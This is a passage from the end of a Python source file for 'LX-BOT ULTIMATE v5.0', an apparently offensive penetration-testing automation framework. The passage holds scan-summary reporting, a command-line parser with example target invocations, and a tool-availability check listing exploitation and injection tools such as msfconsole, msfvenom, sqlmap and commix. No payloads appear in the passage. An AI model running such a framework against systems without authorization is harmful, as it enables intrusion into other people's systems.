                gen = UltimateReportGenerator(self.store.snapshot(), self.store.stats)
                report_file = str(self.outdir / f'{self.domain}_report.html')
                gen.generate(report_file)
                report_path = report_file
            except Exception as exc:
                print_warn(f'Report generation failed: {exc}')
        else:
            print_warn('report_generator.py not found – skipping HTML report')

        self._print_final_summary(elapsed, json_path, report_path)

    def _print_banner(self):
        """Print startup banner with target info."""
        console.print(BANNER)
        console.print(Panel.fit(
            f'[bold white]Target:[/bold white] [bold cyan]{self.target}[/bold cyan]\n'
            f'[bold white]Domain:[/bold white] [bold cyan]{self.domain}[/bold cyan]\n'
            f'[bold white]Output:[/bold white] [dim]{self.outdir}[/dim]\n'
            f'[bold white]Proxy :[/bold white] [dim]{self.proxy or "None"}[/dim]\n'
            f'[bold white]Threads:[/bold white] {self.threads}  '
            f'[bold white]Phases:[/bold white] {self.only_phases}\n'
            f'[bold white]Started:[/bold white] {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            title='[bold cyan]LX-BOT ULTIMATE v5.0[/bold cyan]',
            border_style='cyan',
            box=box.DOUBLE,
        ))

    def _print_final_summary(self, elapsed: float, json_path: Path, report_path: Optional[str]):
        """Print comprehensive final summary."""
        stats    = self.store.stats
        vulns    = self.store.vulns_by_severity()
        top_v    = self.store.top_vulns(10)

        console.print(f'\n\n[bold cyan]{"═"*70}[/bold cyan]')
        console.print('[bold cyan]  SCAN COMPLETE – FINAL SUMMARY[/bold cyan]')
        console.print(f'[bold cyan]{"═"*70}[/bold cyan]\n')

        # Stats table
        stats_tbl = Table(title='Scan Statistics', box=box.ROUNDED, border_style='cyan')
        stats_tbl.add_column('Metric',  style='bold cyan')
        stats_tbl.add_column('Value',   style='bold white', justify='right')
        stats_tbl.add_row('Target',          self.target)
        stats_tbl.add_row('Duration',        f'{elapsed/60:.1f} min')
        stats_tbl.add_row('Commands Run',    str(self.runner.stats.get('commands_run', 0)))
        stats_tbl.add_row('Subdomains',      str(stats.get('subdomains', 0)))
        stats_tbl.add_row('Live Hosts',      str(stats.get('live_hosts', 0)))
        stats_tbl.add_row('Open Ports',      str(stats.get('open_ports', 0)))
        stats_tbl.add_row('Total Findings',  str(stats.get('vulnerabilities', 0)))
        console.print(stats_tbl)

        # Severity breakdown
        sev_tbl = Table(title='Vulnerability Breakdown', box=box.ROUNDED, border_style='red')
        sev_tbl.add_column('Severity', style='bold')
        sev_tbl.add_column('Count',    justify='right', style='bold white')
        sev_data = [
            ('CRITICAL', 'red',     stats.get('critical', 0)),
            ('HIGH',     'orange1', stats.get('high', 0)),
            ('MEDIUM',   'yellow',  stats.get('medium', 0)),
            ('LOW',      'green',   stats.get('low', 0)),
            ('INFO',     'cyan',    stats.get('info', 0)),
        ]
        for label, col, count in sev_data:
            sev_tbl.add_row(f'[{col}]{label}[/{col}]', str(count))
        console.print(sev_tbl)

        # Top vulnerabilities
        if top_v:
            top_tbl = Table(title='Top 10 Findings', box=box.ROUNDED, border_style='red')
            top_tbl.add_column('#', style='dim', width=3)
            top_tbl.add_column('Severity', width=10)
            top_tbl.add_column('Finding',  style='bold white')
            top_tbl.add_column('URL',      style='dim', max_width=50)
            top_tbl.add_column('Tool',     style='dim', width=12)

            for i, v in enumerate(top_v, 1):
                sev  = v.get('severity', 'info')
                col  = SEV_COLOR.get(sev, 'white')
                top_tbl.add_row(
                    str(i),
                    f'[{col}]{sev.upper()}[/{col}]',
                    escape(v.get('name', '')[:60]),
                    escape(v.get('url', '')[:50]),
                    v.get('tool', ''),
                )
            console.print(top_tbl)

        # Output files
        files_tbl = Table(title='Output Files', box=box.ROUNDED, border_style='green')
        files_tbl.add_column('File', style='bold cyan')
        files_tbl.add_column('Path', style='dim')
        files_tbl.add_row('JSON Results', str(json_path))
        if report_path:
            files_tbl.add_row('HTML Report',  report_path)
        files_tbl.add_row('Output Dir', str(self.outdir))
        console.print(files_tbl)

        # Risk assessment
        crit = stats.get('critical', 0)
        high = stats.get('high', 0)
        if crit > 0:
            risk_color = 'bold red'
            risk_label = f'CRITICAL RISK – {crit} critical vulnerabilities require immediate remediation'
        elif high > 0:
            risk_color = 'bold orange1'
            risk_label = f'HIGH RISK – {high} high-severity vulnerabilities found'
        elif stats.get('medium', 0) > 0:
            risk_color = 'bold yellow'
            risk_label = 'MEDIUM RISK – Remediation recommended'
        else:
            risk_color = 'bold green'
            risk_label = 'LOW RISK – Minor issues only'

        console.print(Panel(
            f'[{risk_color}]{risk_label}[/{risk_color}]',
            title='[bold]Risk Assessment[/bold]',
            border_style='red' if crit > 0 else 'yellow',
        ))
        console.print('\n[dim]Report generated by LX-BOT ULTIMATE v5.0 | For authorized testing only[/dim]\n')


# ═══════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSER & ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog='lx-bot',
        description=(
            'LX-BOT ULTIMATE v5.0 – Next-Gen Enterprise Penetration Testing\n'
            'Bug Bounty & Red Team Automation Framework | 60+ Tools | 10 Phases'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 lx-bot.py -t https://target.com
  python3 lx-bot.py -t https://target.com --proxy http://127.0.0.1:8080
  python3 lx-bot.py -t https://target.com --threads 30 --only-phases 1,2,6
  python3 lx-bot.py -t https://target.com --skip-heavy -o /tmp/results
  sudo python3 lx-bot.py -t https://target.com --full

NOTES:
  • Masscan requires root (sudo)
  • Set WPSCAN_API and GITHUB_TOKEN env vars for enhanced results
  • Use --proxy to route all traffic through Burp Suite
        """
    )

    # ── Required ─────────────────────────────────────────────────────────
    parser.add_argument(
        '-t', '--target', required=True,
        metavar='URL',
        help='Target URL or domain (e.g. https://target.com)'
    )

    # ── Scan Control ─────────────────────────────────────────────────────
    scan_grp = parser.add_argument_group('Scan Control')
    scan_grp.add_argument(
        '--threads', '-T', type=int, default=20, metavar='N',
        help='Concurrent threads (default: 20)'
    )
    scan_grp.add_argument(
        '--only-phases', metavar='1,2,3',
        help='Run specific phases only (comma-separated, e.g. 1,2,6,7)'
    )
    scan_grp.add_argument(
        '--skip-heavy', action='store_true',
        help='Skip heavy/slow tools (amass, nikto, commix)'
    )
    scan_grp.add_argument(
        '--full', action='store_true',
        help='Run all 10 phases with maximum coverage (default)'
    )

    # ── Proxy ─────────────────────────────────────────────────────────────
    proxy_grp = parser.add_argument_group('Proxy')
    proxy_grp.add_argument(
        '--proxy', '-P', metavar='URL',
        help='HTTP proxy (e.g. http://127.0.0.1:8080 for Burp Suite)'
    )

    # ── Output ────────────────────────────────────────────────────────────
    out_grp = parser.add_argument_group('Output')
    out_grp.add_argument(
        '-o', '--output', metavar='DIR',
        help='Output directory (default: ./lx-bot-results/)'
    )

    # ── Auth Tokens ───────────────────────────────────────────────────────
    auth_grp = parser.add_argument_group('API Keys & Tokens')
    auth_grp.add_argument(
        '--wpscan-api', metavar='KEY',
        help='WPScan API token for vulnerability database'
    )
    auth_grp.add_argument(
        '--github-token', metavar='TOKEN',
        help='GitHub personal access token for OSINT'
    )

    # ── Utility ───────────────────────────────────────────────────────────
    util_grp = parser.add_argument_group('Utility')
    util_grp.add_argument(
        '--check-tools', action='store_true',
        help='Check which tools are installed and exit'
    )
    util_grp.add_argument(
        '--install-tools', action='store_true',
        help='Install all missing tools via resource_manager.py and exit'
    )
    util_grp.add_argument(
        '--version', action='version', version=f'LX-BOT {VERSION}'
    )

    return parser


def check_tools_status():
    """Display tool availability status."""
    tools = [
        ('msfconsole',  'exploitation'),  ('msfvenom', 'exploitation'),
        ('searchsploit','exploitation'),  ('nmap',     'network'),
        ('masscan',     'network'),       ('rustscan', 'network'),
        ('subfinder',   'recon'),         ('assetfinder','recon'),
        ('amass',       'recon'),         ('findomain','recon'),
        ('httpx',       'web'),           ('whatweb',  'web'),
        ('wafw00f',     'web'),           ('nikto',    'web'),
        ('katana',      'crawling'),      ('gospider', 'crawling'),
        ('hakrawler',   'crawling'),      ('subjs',    'crawling'),
        ('ffuf',        'fuzzing'),       ('feroxbuster','fuzzing'),
        ('dirsearch',   'fuzzing'),       ('gobuster', 'fuzzing'),
        ('nuclei',      'vuln-scan'),     ('jaeles',   'vuln-scan'),
        ('sqlmap',      'injection'),     ('dalfox',   'injection'),
        ('commix',      'injection'),     ('wpscan',   'cms'),
        ('joomscan',    'cms'),           ('droopescan','cms'),
        ('testssl.sh',  'ssl'),           ('sslscan',  'ssl'),
        ('gowitness',   'screenshots'),   ('aquatone', 'screenshots'),
        ('theHarvester','osint'),         ('trufflehog','osint'),
        ('gitleaks',    'osint'),         ('gitrob',   'osint'),
        ('gf',          'utility'),       ('jq',       'utility'),
        ('subfinder',   'recon'),         ('subover',  'recon'),
        ('subjack',     'recon'),         ('chaos',    'recon'),
    ]

    tbl = Table(
        title='Tool Status',
        box=box.ROUNDED,
        border_style='cyan',
        show_lines=False,
    )
    tbl.add_column('Tool',     style='cyan',      width=18)
    tbl.add_column('Category', style='dim',       width=14)
    tbl.add_column('Status',   justify='center',  width=14)

    installed = 0
    for tool, category in tools:
        ok = tool_exists(tool)
        if ok:
            installed += 1
        status = '[bold green]✓ Installed[/bold green]' if ok else '[bold red]✗ Missing[/bold red]'
        tbl.add_row(tool, category, status)

    console.print(tbl)
    pct = installed / len(tools) * 100
    console.print(
        f'\n[bold]Installed: {installed}/{len(tools)} ({pct:.1f}%)[/bold]'
    )
    if installed < len(tools):
        console.print(
            '\n[yellow]Run: python3 resource_manager.py --install[/yellow]'
        )


def main():
    """Main entry point."""
    parser = build_parser()
    args   = parser.parse_args()

    # ── Utility actions ──────────────────────────────────────────────────
    if args.check_tools:
        console.print(BANNER)
        check_tools_status()
        sys.exit(0)

    if args.install_tools:
        console.print(BANNER)
        try:
            from resource_manager import UltimateResourceManager
            mgr = UltimateResourceManager()
            mgr.check_and_install_all()
        except ImportError:
            print_err('resource_manager.py not found')
            console.print('[yellow]Run: python3 resource_manager.py --install[/yellow]')
        sys.exit(0)

    # ── Parse phases ─────────────────────────────────────────────────────
    only_phases = None
    if args.only_phases:
        try:
            only_phases = [int(p.strip()) for p in args.only_phases.split(',')]
        except ValueError:
            print_err('--only-phases must be comma-separated integers (e.g. 1,2,6)')
            sys.exit(1)

    # ── Banner ────────────────────────────────────────────────────────────
    console.print(BANNER)

    # ── Launch bot ────────────────────────────────────────────────────────
    bot = LXBotUltimate(
        target       = args.target,
        proxy        = args.proxy,
        threads      = args.threads,
        output_dir   = args.output,
        skip_heavy   = args.skip_heavy,
        only_phases  = only_phases,
        wpscan_api   = args.wpscan_api,
        github_token = args.github_token,
    )

    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        console.print('\n[bold yellow]Scan interrupted by user.[/bold yellow]')
        bot.store.save_json()
        console.print(f'[dim]Partial results saved to {bot.outdir}[/dim]')
        sys.exit(0)


if __name__ == '__main__':
    main()
